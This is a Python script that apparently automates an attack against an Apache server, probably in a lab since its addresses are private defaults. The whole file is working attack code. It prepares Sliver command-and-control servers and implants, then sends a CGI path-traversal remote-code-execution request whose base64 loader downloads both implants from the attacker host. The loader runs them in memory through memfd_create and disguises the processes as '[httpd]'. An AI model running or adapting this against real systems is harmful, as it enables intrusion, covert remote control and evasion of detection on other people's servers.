import socket
import time
import base64
from urllib.parse import urlparse
import subprocess
import sys
import os

def is_port_open(port):
    """Check if a local port is currently in use/open on 127.0.0.1."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        try:
            s.connect(("127.0.0.1", port))
            return True
        except Exception:
            return False

def ensure_sliver_daemon():
    """Verify that the sliver-server daemon is active on port 31337.
    If not active, starts the daemon in the background.
    """
    if not is_port_open(31337):
        print("[*] Sliver daemon is not active. Starting sliver-server daemon...")
        subprocess.Popen(
            ["sliver-server", "daemon"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        print("[*] Waiting 12 seconds for Sliver daemon to initialize...")
        time.sleep(12)
    else:
        print("[+] Sliver daemon is active.")

def ensure_sliver_client_configured():
    """Verify that sliver-client has at least one operator configuration imported.
    If not, generates a local admin config and imports it.
    """
    client_config_dir = os.path.expanduser("~/.sliver-client/configs")
    has_configs = False
    if os.path.exists(client_config_dir):
        if any(f.endswith(".cfg") for f in os.listdir(client_config_dir)):
            has_configs = True
            
    if not has_configs:
        print("[*] No Sliver client configuration found. Generating and importing local admin configuration...")
        gen_cmd = ["sliver-server", "operator", "--name", "admin", "--lhost", "127.0.0.1", "--permissions", "all", "--save", "/tmp/admin.cfg"]
        subprocess.run(gen_cmd, capture_output=True, text=True)
        import_cmd = ["sliver-client", "import", "/tmp/admin.cfg"]
        subprocess.run(import_cmd, capture_output=True, text=True)
        print("[+] Sliver client successfully configured with local operator config.")
    else:
        print("[+] Sliver client configuration is active.")

def ensure_sliver_listener():
    """Verify that the HTTP C2 listener on port 8080 is active.
    If not active, starts the listener via sliver-client.
    """
    cmd = ["sh", "-c", "echo 'jobs' > /tmp/list_jobs.rc && echo 'exit' >> /tmp/list_jobs.rc && sliver-client --rc /tmp/list_jobs.rc"]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if "8080" not in res.stdout:
            print("[*] Sliver HTTP listener on port 8080 not active. Starting listener...")
            start_cmd = ["sh", "-c", "echo 'http -l 8080' > /tmp/start_listener.rc && echo 'exit' >> /tmp/start_listener.rc && sliver-client --rc /tmp/start_listener.rc"]
            subprocess.run(start_cmd, capture_output=True, text=True, timeout=10)
            print("[+] Sliver HTTP listener on port 8080 started.")
        else:
            print("[+] Sliver HTTP listener on port 8080 is active.")
    except Exception as e:
        print(f"[-] Error checking/starting Sliver listener: {e}")

def ensure_beacon_compiled(kali_ip):
    """Verify that both target Sliver implants (session and beacon) are compiled at /tmp.
    If missing, triggers a background garble compilation via sliver-client.
    """
    # 1. Ensure real-time Session implant is compiled
    if not os.path.exists("/tmp/session_implant"):
        print(f"[*] C2 Session implant not found. Compiling targeting {kali_ip}:8080...")
        rc_content = f"generate --http {kali_ip}:8080 --os linux --arch amd64 --save /tmp/session_implant\nexit\n"
        rc_path = "/tmp/compile_session.rc"
        with open(rc_path, "w") as f:
            f.write(rc_content)
        
        cmd = ["sliver-client", "--rc", rc_path]
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
            if "saved to /tmp/session_implant" in res.stdout or os.path.exists("/tmp/session_implant"):
                print("[+] C2 Session implant successfully compiled.")
            else:
                print(f"[-] Error compiling Session: {res.stdout}")
                sys.exit(1)
        except subprocess.TimeoutExpired:
            print("[-] Timeout: Session compilation took longer than 90 seconds.")
            sys.exit(1)
    else:
        print("[+] C2 Session implant exists at /tmp/session_implant.")

    # 2. Ensure passive Beacon implant is compiled (check-in interval set to 5 seconds for testing)
    if not os.path.exists("/tmp/beacon_implant"):
        print(f"[*] C2 Beacon implant not found. Compiling targeting {kali_ip}:8080 with 5s sleep...")
        rc_content = f"generate beacon --http {kali_ip}:8080 --seconds 5 --os linux --arch amd64 --save /tmp/beacon_implant\nexit\n"
        rc_path = "/tmp/compile_beacon.rc"
        with open(rc_path, "w") as f:
            f.write(rc_content)
        
        cmd = ["sliver-client", "--rc", rc_path]
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
            if "saved to /tmp/beacon_implant" in res.stdout or os.path.exists("/tmp/beacon_implant"):
                print("[+] C2 Beacon implant successfully compiled.")
            else:
                print(f"[-] Error compiling Beacon: {res.stdout}")
                sys.exit(1)
        except subprocess.TimeoutExpired:
            print("[-] Timeout: Beacon compilation took longer than 90 seconds.")
            sys.exit(1)
    else:
        print("[+] C2 Beacon implant exists at /tmp/beacon_implant.")

def ensure_file_server():
    """Verify that the Python HTTP web server on port 8000 is active.
    If not active, starts it in /tmp to serve the compiled beacon.
    """
    if not is_port_open(8000):
        print("[*] Python delivery web server on port 8000 is not active. Starting server...")
        subprocess.Popen(
            ["python3", "-m", "http.server", "8000"],
            cwd="/tmp",
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        time.sleep(2)
        print("[+] Python delivery web server started on port 8000.")
    else:
        print("[+] Python delivery web server is active on port 8000.")

def build_payload(kali_ip, file_port):
    """Generate the Base64-encoded Python loader payload.
    This loader runs entirely in-memory using the memfd_create system call.
    It downloads and runs BOTH the session implant and the beacon implant in parallel,
    allowing comparative analysis. Both processes masquerade as '[httpd]' under www-data.
    """
    loader_code = f"""import urllib.request, ctypes, os, sys
try:
    libc = ctypes.CDLL(None)
    
    # 1. Download and execute C2 Session (real-time)
    url_sess = "http://{kali_ip}:{file_port}/session_implant"
    with urllib.request.urlopen(url_sess) as r:
        data_sess = r.read()
    fd_sess = libc.syscall(319, b'httpd_cache', 1)
    if fd_sess >= 0:
        os.write(fd_sess, data_sess)
        if os.fork() == 0:
            os.execve(f"/proc/self/fd/{{fd_sess}}", ["[httpd]"], os.environ)
            sys.exit(0)

    # 2. Download and execute C2 Beacon (5s interval)
    url_beac = "http://{kali_ip}:{file_port}/beacon_implant"
    with urllib.request.urlopen(url_beac) as r:
        data_beac = r.read()
    fd_beac = libc.syscall(319, b'httpd_cache', 1)
    if fd_beac >= 0:
        os.write(fd_beac, data_beac)
        if os.fork() == 0:
            os.execve(f"/proc/self/fd/{{fd_beac}}", ["[httpd]"], os.environ)
            sys.exit(0)

    # CGI parent exits immediately to prevent connection hangs
    print("Content-Type: text/plain\\n")
    print("OK")
    sys.exit(0)
except Exception as e:
    sys.exit(1)
"""
    # Base64 encode the loader script
    b64_bytes = base64.b64encode(loader_code.encode('utf-8'))
    return b64_bytes.decode('utf-8')

def fire_exploit(target_url, kali_ip, file_port=8000):
    """Send the Apache RCE exploit containing the fileless Python loader payload."""
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or 80

    b64_payload = build_payload(kali_ip, file_port)
    payload = f"echo {b64_payload} | base64 -d | python3"
    path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"

    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(payload)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{payload}"
    )

    print(f"[*] Sending fileless C2 exploit to {host}:{port}{path}")

    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        s.sendall(request.encode())
        response = s.recv(4096).decode('utf-8', errors='ignore')
        if "200 OK" in response or "OK" in response:
            print("[+] Target executed the payload successfully (HTTP 200).")
        else:
            print(f"[-] Exploit response: {response.splitlines()[0] if response else 'No response'}")
    except Exception as e:
        print(f"[-] Error sending exploit: {e}")
    finally:
        if s is not None:
            s.close()

def check_sliver_session():
    """Run sliver-client to query both sessions and beacons."""
    cmd = ["sh", "-c", "echo 'sessions' > /tmp/list_sess.rc && echo 'beacons' >> /tmp/list_sess.rc && echo 'exit' >> /tmp/list_sess.rc && sliver-client --rc /tmp/list_sess.rc"]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return res.stdout
    except Exception as e:
        print(f"[-] Error checking Sliver sessions/beacons: {e}")
        return ""

def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
    """Orchestrate the entire initial access simulation."""
    target_url = f"http://{target_ip}"
    
    # 0. Check and satisfy all C2 server prerequisites
    print("[*] Checking C2 orchestration prerequisites...")
    ensure_sliver_daemon()
    ensure_sliver_client_configured()
    ensure_sliver_listener()
    ensure_beacon_compiled(kali_ip)
    ensure_file_server()
    print("[+] All C2 prerequisites are satisfied.")
    
    # 1. Fire the exploit
    fire_exploit(target_url, kali_ip, file_port)
    
    # 2. Wait and poll for the sessions/beacons in Sliver
    print("[*] Waiting for Sliver C2 check-ins (polling every 5s)...")
    for attempt in range(1, 15):
        time.sleep(5)
        output = check_sliver_session()
        # Look for any active connections/beacons in Sliver's output
        if "linux" in output.lower() or "active" in output.lower():
            lines = output.splitlines()
            matches = [l for l in lines if "http" in l.lower() or "linux" in l.lower()]
            if matches:
                print(f"[+] Success! Active C2 connection(s) detected in Sliver:")
                for m in matches:
                    print(f"    {m}")
                return True
        print(f"[*] Attempt {attempt}/14: No C2 check-ins yet...")
        
    print("[-] Timeout: Sliver connections failed to establish.")
    return False

if __name__ == "__main__":
    target = "10.10.0.3"
    kali = "10.10.0.2"
    if len(sys.argv) > 1:
        target = sys.argv[1]
    if len(sys.argv) > 2:
        kali = sys.argv[2]
        
    deploy_fileless_c2(target, kali)
